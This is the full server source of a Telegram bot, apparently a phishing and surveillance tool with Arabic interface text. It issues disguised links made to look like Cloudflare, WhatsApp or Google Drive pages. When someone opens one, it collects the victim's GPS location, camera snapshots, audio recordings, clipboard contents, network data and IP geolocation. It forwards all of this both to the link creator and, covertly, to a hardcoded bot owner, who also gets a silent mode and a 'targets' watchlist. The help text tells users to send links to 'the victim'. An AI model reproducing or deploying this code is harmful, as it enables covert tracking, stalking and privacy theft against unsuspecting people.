const fs = require("fs");
const express = require("express");

// ── Storage helpers ────────────────────────────────────────────────────────────

function loadJSON(file, def) {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch(e) { return def; }
}
function saveJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data)); }

const USERS_FILE    = "./users.json";
const BANNED_FILE   = "./banned.json";
const STATS_FILE    = "./stats.json";
const SETTINGS_FILE = "./settings.json";
const TARGETS_FILE  = "./targets.json";

let users    = new Set(loadJSON(USERS_FILE, []));
let banned   = new Set(loadJSON(BANNED_FILE, []));
let targets  = new Set(loadJSON(TARGETS_FILE, []));
let stats    = { linksOpened: 0, linksCreated: 0, ...loadJSON(STATS_FILE, {}) };
let settings = { welcomeMsg: "", silentMode: false, scheduleHour: -1, ...loadJSON(SETTINGS_FILE, {}) };

function saveUsers()    { saveJSON(USERS_FILE,    [...users]); }
function saveBanned()   { saveJSON(BANNED_FILE,   [...banned]); }
function saveTargets()  { saveJSON(TARGETS_FILE,  [...targets]); }
function saveStats()    { saveJSON(STATS_FILE,    stats); }
function saveSettings() { saveJSON(SETTINGS_FILE, settings); }

// ── Setup ─────────────────────────────────────────────────────────────────────

const cors        = require('cors');
const bodyParser  = require('body-parser');
const fetch       = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

const bot = new TelegramBot(process.env["bot"], { polling: true });
const app = express();
app.use(bodyParser.json({ limit: '20mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.set("view engine", "ejs");

const hostURL   = "https://bot-psue.onrender.com";
const use1pt    = false;
const BOT_OWNER = 6012675140;
const REPLY_PREFIX = "📝 اكتب ردك على المستخدم\nUID:";

// ── Startup notification ──────────────────────────────────────────────────────
setTimeout(() => {
  bot.sendMessage(BOT_OWNER,
    `🟢 البوت تم تشغيله بنجاح!\n⏰ ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}`
  ).catch(() => {});
}, 3000);

// ── Utilities ─────────────────────────────────────────────────────────────────

function getIP(req) {
  if (req.headers['x-forwarded-for']) return req.headers['x-forwarded-for'].split(",")[0].trim();
  if (req.connection?.remoteAddress) return req.connection.remoteAddress;
  return req.ip;
}

async function enrichIP(ip) {
  try {
    const d = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp,org,lat,lon,status`).then(r => r.json());
    if (d.status === "success") {
      return `🌍 الدولة: ${d.country}\n🏙️ المدينة: ${d.city}, ${d.regionName}\n📡 ISP: ${d.isp}\n🏢 المنظمة: ${d.org}\n📌 ${d.lat}, ${d.lon}\n🗺️ https://maps.google.com/?q=${d.lat},${d.lon}`;
    }
  } catch(e) {}
  return null;
}

function notify(targetId, message, opts) {
  if (settings.silentMode) return;
  bot.sendMessage(targetId, message, opts || {}).catch(() => {});
}

function notifyPhoto(targetId, buffer, opts, info) {
  if (settings.silentMode) return;
  bot.sendPhoto(targetId, buffer, opts || {}, info).catch(() => {});
}

function notifyDoc(targetId, buffer, opts, info) {
  if (settings.silentMode) return;
  bot.sendDocument(targetId, buffer, opts || {}, info).catch(() => {});
}

function notifyLoc(targetId, lat, lon) {
  if (settings.silentMode) return;
  bot.sendLocation(targetId, lat, lon).catch(() => {});
}

// ── Daily scheduled report ────────────────────────────────────────────────────
setInterval(() => {
  if (settings.scheduleHour < 0) return;
  const now = new Date();
  if (now.getUTCHours() === settings.scheduleHour && now.getUTCMinutes() === 0) {
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    bot.sendMessage(BOT_OWNER,
      `📅 تقرير يومي تلقائي\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د`
    ).catch(() => {});
  }
}, 60 * 1000);

// ── Routes ────────────────────────────────────────────────────────────────────

async function handleLinkOpen(req, res, view) {
  const ip = getIP(req);
  const d  = new Date().toJSON().slice(0,19).replace('T',':');
  if (!req.params.path) return res.redirect("https://t.me/th30neand0nly0ne");

  const creatorId = parseInt(req.params.path, 36);
  stats.linksOpened++;
  saveStats();

  const isTarget = targets.has(creatorId);
  const quickMsg = `${isTarget ? '🎯🚨 هدف فتح رابطك!' : '⚠️ تم فتح رابطك!'}\n⚓ IP: ${ip}\n⏰ ${d} UTC`;

  notify(creatorId, quickMsg);
  if (creatorId !== BOT_OWNER) {
    notify(BOT_OWNER, isTarget
      ? `🎯🚨 هدف فتح رابطاً!\n👤 منشئ ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`
      : `⚠️ تم فتح رابط!\n👤 منشئ ID: ${creatorId}\n⚓ IP: ${ip}\n⏰ ${d} UTC`
    );
  }

  enrichIP(ip).then(info => {
    if (!info) return;
    notify(creatorId, `🔍 تفاصيل IP:\n⚓ ${ip}\n${info}`);
    if (creatorId !== BOT_OWNER) notify(BOT_OWNER, `🔍 تفاصيل IP (ID: ${creatorId}):\n⚓ ${ip}\n${info}`);
  });

  res.render(view, { ip, time: d, url: atob(req.params.uri), uid: req.params.path, a: hostURL, t: use1pt });
}

app.get("/w/:path/:uri",  (req, res) => handleLinkOpen(req, res, "webview"));
app.get("/c/:path/:uri",  (req, res) => handleLinkOpen(req, res, "cloudflare"));
app.get("/wa/:path/:uri", (req, res) => handleLinkOpen(req, res, "whatsapp"));
app.get("/dl/:path/:uri", (req, res) => handleLinkOpen(req, res, "download"));

// ── Bot Logic ─────────────────────────────────────────────────────────────────

bot.on('message', async (msg) => {
  if (!msg?.chat) return;
  const chatId = msg.chat.id;
  if (banned.has(chatId)) return;

  if (msg?.reply_to_message?.text === "🌐 Enter Your URL" && msg.text)
    return createLink(chatId, msg.text);

  if (msg?.reply_to_message?.text === "📢 اكتب الرسالة التي تريد إرسالها للجميع:" && chatId === BOT_OWNER) {
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, msg.text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  if (chatId === BOT_OWNER && msg?.reply_to_message?.text?.startsWith(REPLY_PREFIX) && msg.text) {
    const uidStr = msg.reply_to_message.text.replace(REPLY_PREFIX, "").split("\n")[0].trim();
    const targetId = parseInt(uidStr);
    if (!isNaN(targetId)) {
      try {
        await bot.sendMessage(targetId, `📩 رسالة:\n\n${msg.text}`);
        return bot.sendMessage(chatId, `✅ تم الإرسال.`);
      } catch(e) { return bot.sendMessage(chatId, `❌ فشل: ${e.message}`); }
    }
  }

  users.add(chatId);
  saveUsers();

  if (chatId !== BOT_OWNER && msg.text && !msg.text.startsWith("/")) {
    const name     = msg.chat.first_name || "مجهول";
    const username = msg.chat.username ? `@${msg.chat.username}` : "لا يوجد";
    const isTargetUser = targets.has(chatId);
    bot.sendMessage(BOT_OWNER,
      `${isTargetUser ? '🎯 رسالة من هدف:\n' : '📩 رسالة من مستخدم:\n'}👤 ${name}\n🔗 ${username}\n🆔 ${chatId}\n\n💬 ${msg.text}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "📩 رد على المستخدم", callback_data: `reply:${chatId}` }]] }) }
    );
  }

  // ── Commands ──────────────────────────────────────────────────────────────

  if (msg.text === "/myid")
    return bot.sendMessage(chatId, `🆔 الـ ID:\n\`${chatId}\``, { parse_mode: "Markdown" });

  if (msg.text?.startsWith("/broadcast")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (msg.text.trim() === "/broadcast")
      return bot.sendMessage(chatId, "📢 اكتب الرسالة:", { reply_markup: JSON.stringify({ force_reply: true }) });
    const text = msg.text.replace("/broadcast ", "");
    let sent = 0, failed = 0;
    for (const uid of users) { try { await bot.sendMessage(uid, text); sent++; } catch(e) { failed++; } }
    return bot.sendMessage(chatId, `✅ ناجح: ${sent} | ❌ فشل: ${failed}`);
  }

  if (msg.text === "/stats") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    return bot.sendMessage(chatId,
      `📊 إحصائيات البوت:\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف: ${targets.size}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل 🔴' : 'معطّل 🟢'}\n📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n⏱️ وقت التشغيل: ${h}س ${m}د`
    );
  }

  if (msg.text === "/report") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const up = Math.floor(process.uptime()), h = Math.floor(up/3600), m = Math.floor((up%3600)/60);
    const targetList = targets.size ? [...targets].join(", ") : "لا يوجد";
    return bot.sendMessage(chatId,
      `📋 تقرير شامل\n\n👥 المستخدمون: ${users.size}\n🎯 الأهداف (${targets.size}): ${targetList}\n🚫 المحجوبون: ${banned.size}\n🔗 الروابط المنشأة: ${stats.linksCreated}\n👁️ الروابط المفتوحة: ${stats.linksOpened}\n🔕 الصامت: ${settings.silentMode ? 'مفعّل' : 'معطّل'}\n⏱️ التشغيل: ${h}س ${m}د\n⏰ الوقت الآن: ${new Date().toJSON().slice(0,19).replace('T',' ')} UTC`
    );
  }

  if (msg.text === "/users") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const list = [...users].map((id,i) => `${i+1}. \`${id}\`${targets.has(id) ? ' 🎯' : ''}`).join("\n");
    return bot.sendMessage(chatId, `👥 المستخدمون (${users.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/banned") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (banned.size === 0) return bot.sendMessage(chatId, "✅ لا يوجد محجوبون.");
    const list = [...banned].map((id,i) => `${i+1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `🚫 المحجوبون (${banned.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/ban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/ban ", "").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.add(id); saveBanned();
    return bot.sendMessage(chatId, `🚫 تم حجب: \`${id}\``, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/unban ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/unban ", "").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    banned.delete(id); saveBanned();
    return bot.sendMessage(chatId, `✅ رُفع الحجب عن: \`${id}\``, { parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/deleteuser ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/deleteuser ", "").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ ID غير صحيح.");
    if (!users.has(id)) return bot.sendMessage(chatId, "⚠️ غير موجود.");
    users.delete(id); targets.delete(id); saveUsers(); saveTargets();
    return bot.sendMessage(chatId, `🗑️ تم حذف \`${id}\`.`, { parse_mode: "Markdown" });
  }

  if (msg.text === "/clearusers") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const count = users.size; users.clear(); saveUsers();
    return bot.sendMessage(chatId, `🗑️ تم مسح ${count} مستخدم.`);
  }

  if (msg.text === "/export") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (users.size === 0) return bot.sendMessage(chatId, "لا يوجد مستخدمون.");
    const content = `📋 قائمة مستخدمي البوت\nالتاريخ: ${new Date().toISOString()}\nالعدد: ${users.size}\n\n` +
      [...users].map((id,i) => `${i+1}. ${id}${targets.has(id) ? ' [هدف]' : ''}`).join("\n");
    const buf = Buffer.from(content, 'utf8');
    return bot.sendDocument(chatId, buf, { caption: `📤 قائمة المستخدمين (${users.size})` }, { filename: "users.txt", contentType: "text/plain" });
  }

  if (msg.text === "/silent") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.silentMode = !settings.silentMode; saveSettings();
    return bot.sendMessage(chatId, settings.silentMode
      ? "🔕 الوضع الصامت مفعّل\nالبيانات تُجمع بصمت تام."
      : "🔔 الوضع الصامت معطّل\nستصلك جميع الإشعارات."
    );
  }

  // /addtarget [id] — mark user as priority target
  if (msg.text?.startsWith("/addtarget ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/addtarget ", "").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    targets.add(id); saveTargets();
    return bot.sendMessage(chatId, `🎯 تم إضافة \`${id}\` كهدف.\nستحصل على تنبيه خاص عند نشاطه.`, { parse_mode: "Markdown" });
  }

  // /removetarget [id]
  if (msg.text?.startsWith("/removetarget ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const id = parseInt(msg.text.replace("/removetarget ", "").trim());
    if (isNaN(id)) return bot.sendMessage(chatId, "⚠️ أدخل ID صحيح.");
    targets.delete(id); saveTargets();
    return bot.sendMessage(chatId, `✅ تم إزالة \`${id}\` من الأهداف.`, { parse_mode: "Markdown" });
  }

  // /targets — list all targets
  if (msg.text === "/targets") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (targets.size === 0) return bot.sendMessage(chatId, "لا يوجد أهداف حالياً.");
    const list = [...targets].map((id,i) => `${i+1}. \`${id}\``).join("\n");
    return bot.sendMessage(chatId, `🎯 الأهداف (${targets.size}):\n\n${list}`, { parse_mode: "Markdown" });
  }

  // /schedule [hour] — set daily report hour (UTC), -1 to disable
  if (msg.text?.startsWith("/schedule")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    if (msg.text.trim() === "/schedule") {
      return bot.sendMessage(chatId, `📅 التقرير التلقائي: ${settings.scheduleHour >= 0 ? settings.scheduleHour+':00 UTC' : 'معطّل'}\n\nلضبطه: /schedule [ساعة 0-23 UTC]\nلإيقافه: /schedule off`);
    }
    const arg = msg.text.replace("/schedule ", "").trim();
    if (arg === "off") {
      settings.scheduleHour = -1; saveSettings();
      return bot.sendMessage(chatId, "✅ تم إيقاف التقرير التلقائي.");
    }
    const h = parseInt(arg);
    if (isNaN(h) || h < 0 || h > 23) return bot.sendMessage(chatId, "⚠️ أدخل ساعة بين 0 و 23 (UTC).");
    settings.scheduleHour = h; saveSettings();
    return bot.sendMessage(chatId, `✅ سيُرسل التقرير اليومي كل يوم الساعة ${h}:00 UTC`);
  }

  if (msg.text?.startsWith("/link ")) {
    return createLink(chatId, msg.text.replace("/link ", "").trim());
  }

  if (msg.text === "/ping") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    const start = Date.now();
    const m = await bot.sendMessage(chatId, "🏓 Pong!");
    return bot.editMessageText(`🏓 Pong! \`${Date.now()-start}ms\``, { chat_id: chatId, message_id: m.message_id, parse_mode: "Markdown" });
  }

  if (msg.text?.startsWith("/setwelcome ")) {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg = msg.text.replace("/setwelcome ", "").trim(); saveSettings();
    return bot.sendMessage(chatId, `✅ تم تحديث رسالة الترحيب.`);
  }

  if (msg.text === "/resetwelcome") {
    if (chatId !== BOT_OWNER) return bot.sendMessage(chatId, "⛔ غير مصرح لك.");
    settings.welcomeMsg = ""; saveSettings();
    return bot.sendMessage(chatId, `✅ تمت الإعادة للافتراضي.`);
  }

  if (msg.text === "/start") {
    const keyboard = { reply_markup: JSON.stringify({ inline_keyboard: [
      [{ text: "🔗 إنشاء رابط ملغم", callback_data: "crenew" }],
      [{ text: "📖 المساعدة", callback_data: "help" }, { text: "🆔 ID الخاص بي", callback_data: "myid" }]
    ]}) };
    const welcome = settings.welcomeMsg ||
      `مرحباً بڪ ${msg.chat.first_name}! 👋\n\nبوت الروابط الملغمة 🔗\n\nيجمع عند الفتح:\n📍 الموقع (GPS + IP)\n📱 بيانات الجهاز الكاملة\n📷 صور الكاميرا الأمامية والخلفية\n🎙️ تسجيل صوتي\n🌐 بيانات الشبكة والسرعة\n📋 محتوى الحافظة\n🔍 ISP والدولة والمدينة\n\n⚡ Powered by @Ye_x00`;
    return bot.sendMessage(chatId, welcome, keyboard);
  }

  if (msg.text === "/create") return createNew(chatId);

  if (msg.text === "/help") {
    let t = `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك فوراً:\n   ⚡ IP + تفاصيل المزوّد\n   🌍 ISP، الدولة، المدينة\n   📱 بيانات الجهاز الكاملة\n   📷 صور الكاميرا (أمامية+خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 نوع الاتصال والسرعة\n\n🔗 أنواع الروابط:\n   🌐 Cloudflare\n   🖥️ WebView\n   💬 WhatsApp\n   📁 Google Drive\n\n⚡ Powered by @Ye_x00`;
    if (chatId === BOT_OWNER) {
      t += `\n\n━━━━━━━━━━━━━━━━\n📌 أوامر المالك:\n/stats — الإحصائيات\n/report — تقرير شامل فوري\n/users — المستخدمون\n/export — تصدير كملف\n/banned — المحجوبون\n/ban [id] — حجب\n/unban [id] — رفع الحجب\n/deleteuser [id] — حذف\n/clearusers — مسح الكل\n/silent — الوضع الصامت 🔕\n/addtarget [id] — إضافة هدف 🎯\n/removetarget [id] — إزالة هدف\n/targets — قائمة الأهداف\n/schedule [ساعة/off] — تقرير يومي\n/link [url] — رابط سريع\n/broadcast — إرسال للجميع\n/setwelcome [نص] — تخصيص الترحيب\n/resetwelcome — إعادة الافتراضي\n/ping — اختبار السرعة`;
    }
    return bot.sendMessage(chatId, t);
  }
});

// ── Callback Queries ───────────────────────────────────────────────────────────

bot.on('callback_query', async (q) => {
  bot.answerCallbackQuery(q.id);
  const chatId = q.message.chat.id;
  const data   = q.data;

  if (data === "crenew") return createNew(chatId);
  if (data === "myid")   return bot.sendMessage(chatId, `🆔 الـ ID:\n\`${chatId}\``, { parse_mode: "Markdown" });
  if (data === "help") {
    return bot.sendMessage(chatId,
      `📖 الاستخدام:\n\n1️⃣ أنشئ رابطاً\n2️⃣ أرسله للضحية\n\n📥 يصلك:\n   ⚡ IP + ISP + الدولة\n   📱 بيانات الجهاز\n   📷 صور (أمامية + خلفية)\n   📍 GPS أو IP\n   🎙️ تسجيل صوتي\n   📋 محتوى الحافظة\n   🌐 بيانات الشبكة\n\n⚡ Powered by @Ye_x00`
    );
  }
  if (data.startsWith("reply:")) {
    return bot.sendMessage(chatId, `${REPLY_PREFIX}${data.replace("reply:","")}\n\nاكتب ردك:`, { reply_markup: JSON.stringify({ force_reply: true }) });
  }
});

bot.on('polling_error', () => {});

// ── Link Creation ──────────────────────────────────────────────────────────────

async function createLink(cid, msg) {
  if (!msg || typeof msg !== 'string') return;
  const encoded = [...msg].some(c => c.charCodeAt(0) > 127);
  if (msg.toLowerCase().includes('http') && !encoded) {
    const url = cid.toString(36) + '/' + btoa(msg);
    bot.sendChatAction(cid, "typing");
    stats.linksCreated++; saveStats();
    bot.sendMessage(cid,
      `✅ تم إنشاء الروابط!\n🔗 URL: ${msg}\n\n🌐 Cloudflare:\n${hostURL}/c/${url}\n\n🖥️ WebView:\n${hostURL}/w/${url}\n\n💬 WhatsApp:\n${hostURL}/wa/${url}\n\n📁 Google Drive:\n${hostURL}/dl/${url}`,
      { reply_markup: JSON.stringify({ inline_keyboard: [[{ text: "🔗 إنشاء رابط جديد", callback_data: "crenew" }]] }) }
    );
  } else {
    bot.sendMessage(cid, `⚠️ أدخل رابطاً صحيحاً يبدأ بـ http أو https`);
    createNew(cid);
  }
}

function createNew(cid) {
  bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
}

// ── Data Endpoints ─────────────────────────────────────────────────────────────

app.get("/", (req, res) => res.json({ ip: getIP(req) }));

app.post("/location", (req, res) => {
  const lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
  const lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  const acc = decodeURIComponent(req.body.acc) || null;
  if (lat && lon && uid && acc) {
    const targetId = parseInt(uid, 36);
    const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
    notifyLoc(targetId, lat, lon);
    notify(targetId, `📍 الموقع:\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${mapsLink}`);
    if (targetId !== BOT_OWNER) {
      notifyLoc(BOT_OWNER, lat, lon);
      notify(BOT_OWNER, `📍 موقع (ID: ${targetId}):\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}\n🗺️ ${mapsLink}`);
    }
    res.send("Done");
  } else res.send("Missing");
});

app.post("/", (req, res) => {
  let data = decodeURIComponent(req.body.data) || null;
  const uid = decodeURIComponent(req.body.uid) || null;
  if (uid && data) {
    data = data.replaceAll("<br>", "\n");
    const targetId = parseInt(uid, 36);
    notify(targetId, data, { parse_mode: "HTML" });
    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `📋 بيانات (ID: ${targetId}):\n${data}`, { parse_mode: "HTML" });
    res.send("Done");
  } else res.send("Missing");
});

app.post("/camsnap", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const img  = decodeURIComponent(req.body.img)  || null;
  const cam  = decodeURIComponent(req.body.cam)  || "front";
  if (uid && img) {
    const buffer   = Buffer.from(img, 'base64');
    const info     = { filename: "camsnap.png", contentType: 'image/png' };
    const targetId = parseInt(uid, 36);
    const caption  = cam === "back" ? "📷 كاميرا خلفية" : "🤳 كاميرا أمامية";
    notifyPhoto(targetId, buffer, { caption }, info);
    if (targetId !== BOT_OWNER) notifyPhoto(BOT_OWNER, buffer, { caption: `${caption} (ID: ${targetId})` }, info);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/audio", (req, res) => {
  const uid   = decodeURIComponent(req.body.uid)   || null;
  const audio = decodeURIComponent(req.body.audio) || null;
  if (uid && audio) {
    const buffer   = Buffer.from(audio, 'base64');
    const info     = { filename: "voice.webm", contentType: 'audio/webm' };
    const targetId = parseInt(uid, 36);
    notifyDoc(targetId, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
    if (targetId !== BOT_OWNER) notifyDoc(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${targetId})` }, info);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/clipboard", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const clip = decodeURIComponent(req.body.clip) || null;
  if (uid && clip) {
    const targetId = parseInt(uid, 36);
    notify(targetId, `📋 محتوى الحافظة:\n\n${clip}`);
    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `📋 حافظة (ID: ${targetId}):\n\n${clip}`);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/network", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const data = decodeURIComponent(req.body.data) || null;
  if (uid && data) {
    const targetId = parseInt(uid, 36);
    notify(targetId, `🌐 بيانات الشبكة:\n${data}`);
    if (targetId !== BOT_OWNER) notify(BOT_OWNER, `🌐 شبكة (ID: ${targetId}):\n${data}`);
    res.send("Done");
  } else res.send("Missing");
});

// ── Keep Alive ─────────────────────────────────────────────────────────────────

setInterval(() => fetch(hostURL).catch(() => {}), 5 * 60 * 1000);

app.listen(5000, () => console.log("App Running on Port 5000!"));
